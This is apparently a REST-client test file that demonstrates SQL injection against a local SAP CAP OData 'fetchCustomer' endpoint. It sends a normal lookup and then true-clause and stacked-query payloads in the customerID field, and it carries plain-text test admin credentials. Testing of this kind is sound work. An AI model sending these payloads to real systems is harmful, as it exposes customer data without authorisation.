@server=http://localhost:4004
  @username=incident.support@tester.sap.com // admin role
  @password=initial
  
  ### Step 1: Legitimate Customer Lookup
  ### Action: Normal request with valid customer ID
  ### Expected: Returns single customer record
  ### Result: System returns data for customer ID 1004100
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100"
  }
  
  ### Step 2: SQL Injection True-Clause Attack
  ### Action: Inject malicious payload ' OR '1'='1
  ### Expected: Returns ALL customer records
  ### Result: Full database exposure vulnerability
  GET {{server}}/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic {{username}}:{{password}}
  
  {
    "customerID": "1004100' OR '1'='1"
  }

 ### Step 3: Test other common SQL injection payloads to ensure robustness
 ### Action: Inject malicious payload 'UNION SELECT * FROM Customers --" }
 ### Expected: Returns ALL customer records
 ### Result: Full database exposure vulnerability

  GET http://localhost:4004/odata/v4/admin/fetchCustomer
  Content-Type: application/json
  Authorization: Basic incident.support@tester.sap.com:initial

{
  "customerID": "1004100'; SELECT * from sap_capire_incidents_Customers;-- "
}
